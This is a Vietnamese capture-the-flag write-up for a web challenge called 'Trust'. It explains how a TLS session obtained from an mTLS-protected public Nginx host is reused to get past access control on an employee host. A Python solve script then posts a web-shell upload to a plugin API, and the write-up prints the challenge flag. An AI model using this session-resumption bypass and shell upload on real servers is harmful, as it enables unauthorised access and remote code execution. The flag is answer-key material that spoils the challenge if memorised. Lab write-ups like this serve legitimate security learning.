# Trust

**Category:** Web  
**Author:** ReiKage  
**Team:** 6h4T9pTpR0  

## Lời nói đầu
Bài này thuộc thể loại Web Security nhưng lại đụng chạm khá sâu đến cấu hình Server (Nginx) và giao thức SSL/TLS. Nếu bạn chỉ quen exploit SQL Injection hay XSS thì bài này sẽ hơi lạ lẫm một chút, nhưng hiểu rồi thì thấy nó cực kỳ logic và thực tế.

## 1. Phân tích & Reconnaissance

Đề bài cho mình 2 cái domain:
1.  `public.trustboundary.local`: Trang này cho phép truy cập bình thường nếu mình có Client Certificate (mTLS).
2.  `employee.trustboundary.local`: Trang nội bộ, chứa flag hoặc API quan trọng. Nhưng cứ vào là bị ăn lỗi `403 Forbidden` ngay lập tức, kể cả khi đã dùng Certificate xịn.

Mình được cung cấp bộ `client.crt` và `client_rsa.key`.

### Tại sao lại bị chặn?
Mình đoán là cấu hình Nginx nó kiểu như này:

```nginx
server {
    server_name public.trustboundary.local;
    ssl_verify_client on; # Yêu cầu cert
    # ... Cho phép truy cập
}

server {
    server_name employee.trustboundary.local;
    ssl_verify_client on;
    deny all; # Chặn hết, hoặc có rule ACL rất gắt
}
```

Tuy nhiên, có một tính năng của SSL/TLS gọi là **Session Resumption** (Tái sử dụng phiên).
- Khi bạn kết nối HTTPS lần đầu, quá trình bắt tay (Handshake) rất tốn kém (tính toán RSA các kiểu).
- Để cho nhanh, Server sẽ cấp cho bạn một cái `Session ID`.
- Lần sau bạn kết nối lại, bạn chỉ cần chìa cái `Session ID` ra. Server thấy quen quen, check trong cache thấy hợp lệ thì **bỏ qua các bước kiểm tra chứng thực nặng nề** và cho vào luôn.

=> **Lỗ hổng:** Nếu Nginx cấu hình chung một bộ nhớ đệm Session (Session Cache) cho cả 2 server block (`public` và `employee`), thì mình có thể lấy "vé thông hành" ở cổng `public` rồi chạy sang cổng `employee` chìa ra để vào!

## 2. Chiến thuật tấn công (Exploitation Strategy)

Kịch bản tấn công "đi cửa sau" như sau:

1.  **Bước 1 - Lấy vé:** Kết nối tới `public.trustboundary.local` đàng hoàng, dùng cert và key được cấp. Sau khi kết nối thành công, mình lưu lại cái `SSL Session ID`.
2.  **Bước 2 - Đi cửa sau:** Mở một kết nối mới tới `employee.trustboundary.local`.
    - **Quan trọng:** Trong lúc bắt tay (Handshake), mình ép Client gửi cái `Session ID` vừa lấy được ở bước 1.
3.  **Bước 3 - Bypass:** Nginx check thấy Session ID này hợp lệ (do `public` cấp), nó khôi phục phiên làm việc và **bỏ qua** cái đoạn check quyền truy cập gắt gao của `employee`. Thế là mình vào được!
4.  **Bước 4 - RCE:** Sau khi bypass, mình gọi vào API `/api/plugins/upload` để up con shell và lấy flag.

## 3. Viết Tool & Script

Mình dùng Python với thư viện `ssl` và `socket` chuẩn để có thể can thiệp sâu vào quá trình handshake.

### Script khai thác (`solve_trust.py`)

```python
import ssl
import socket
import time

# Cấu hình target
TARGET_IP = 'IP_CUA_SERVER'
PORT = 443

# Load chứng chỉ
context = ssl.create_default_context()
context.load_cert_chain(certfile='client.crt', keyfile='client_rsa.key')
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE # Bỏ qua check cert của server cho đỡ lỗi

print(">>> Bước 1: Kết nối tới Public để lấy Session ID...")
# Tạo socket TCP thường
sock1 = socket.create_connection((TARGET_IP, PORT))
# Bọc SSL quanh socket đó
conn1 = context.wrap_socket(sock1, server_hostname="public.trustboundary.local")

# Lấy Session ra
session_ticket = conn1.session
print(f"[+] Got Session ID: {session_ticket.id.hex()}")
conn1.close() # Đóng kết nối cũ đi

print(">>> Bước 2: Dùng lại Session ID để vào Employee...")
sock2 = socket.create_connection((TARGET_IP, PORT))

# MAGIC HAPPENS HERE: Truyền tham số session=session_ticket
conn2 = context.wrap_socket(sock2, 
                            server_hostname="employee.trustboundary.local", 
                            session=session_ticket)

print("[+] Kết nối thành công tới Employee! Đang gửi request...")

# Gửi HTTP Request thủ công qua socket
http_req = (
    b"POST /api/plugins/upload HTTP/1.1\r\n"
    b"Host: employee.trustboundary.local\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n"
    b"Content-Length: 15\r\n"
    b"\r\n"
    b"shell_content_here"
)

conn2.write(http_req)

# Đọc response
response = conn2.read()
print(response.decode())

conn2.close()
```

### Lưu ý
*   Cần chỉnh file `/etc/hosts` trên máy mình để trỏ 2 domain kia về IP của server giải nếu cần.
*   Payload upload shell thì tùy vào backend là Java (JSP) hay PHP mà mình craft cho phù hợp.

## Kết quả
Server trả về `200 OK` và mình thực thi được lệnh trên server `employee`.

**Flag:** `W1{C3rt5_m34n-NOThINg_W1thOuT-Pr0p3R_uSAg3_PL5_T4k3_lt-In_mInd11}`
